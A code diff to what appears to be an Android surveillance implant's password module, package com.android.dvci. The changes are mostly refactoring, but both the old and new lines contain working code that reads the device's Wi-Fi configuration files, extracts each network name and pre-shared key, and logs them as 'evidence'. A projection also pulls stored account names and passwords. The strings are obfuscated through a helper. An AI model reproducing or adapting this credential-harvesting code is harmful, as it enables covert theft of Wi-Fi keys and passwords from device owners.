@@ -1,11 +1,5 @@
 package com.android.dvci.module;
 
-import java.io.File;
-import java.io.FileInputStream;
-import java.util.HashMap;
-import java.util.Iterator;
-import java.util.List;
-
 import android.database.Cursor;
 
 import com.android.dvci.Status;
@@ -22,6 +16,11 @@ import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
+
+import java.io.File;
+import java.util.HashMap;
+import java.util.Iterator;
+import java.util.List;
 
 public class ModulePassword extends BaseModule {
 
@@ -70,7 +69,7 @@ public class ModulePassword extends BaseModule {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualGo) ");
 		}
-		
+
 		RecordVisitor passwordVisitor = new RecordVisitor() {
 			EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
 			boolean needToSerialize = false;
@@ -117,16 +116,16 @@ public class ModulePassword extends BaseModule {
 
 		String filename_v4 = M.e("/data/misc/wifi/wpa_supplicant.conf");
 		String filename_v2 = M.e("/data/wifi/bcm_supp.conf");
-		if (!dumpWifi(filename_v4)){
+		if (!dumpWifi(filename_v4)) {
 			dumpWifi(filename_v2);
 		}
-			
+
 		// dumpAccounts(passwordVisitor);
 
 	}
 
 	private boolean dumpWifi(String filename) {
-		
+
 		if (Cfg.DEBUG) {
 			File file = new File(filename);
 			Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
@@ -145,21 +144,28 @@ public class ModulePassword extends BaseModule {
 		String ssid = "";
 		String psk = "";
 		EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
-		for (String line : lines) {
-			if (line.contains(M.e("ssid")) && !line.contains(M.e("scan_ssid"))) {
-				ssid = getValue(line);
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (dumpWifi) ssid = %s", ssid);
+		try {
+			for (String line : lines) {
+				if (line.contains(M.e("ssid")) && !line.contains(M.e("scan_ssid"))) {
+					ssid = getValue(line);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (dumpWifi) ssid = %s", ssid);
+					}
+				} else if (line.contains("psk")) {
+					psk = getValue(line);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (dumpWifi) psk = %s", psk);
+					}
+					addToEvidence(evidence, ssid, M.e("SSID"), psk, M.e("Wifi"));
 				}
-			} else if (line.contains("psk")) {
-				psk = getValue(line);
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (dumpWifi) psk = %s", psk);
-				}
-				addToEvidence(evidence, ssid, M.e("SSID"), psk, M.e("Wifi"));
 			}
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpWifi) Error: %s", ex);
+			}
+		} finally {
+			evidence.close();
 		}
-		evidence.close();
 		return true;
 
 	}
@@ -207,7 +213,7 @@ public class ModulePassword extends BaseModule {
 		// h_6=name
 		// h_7=type
 		// h_8=password
-		String[] projection = { M.e("_id"), M.e("name"), M.e("type"), M.e("password ") };
+		String[] projection = {M.e("_id"), M.e("name"), M.e("type"), M.e("password ")};
 		visitor.projection = projection;
 
 		helper.traverseRecords(table, visitor);
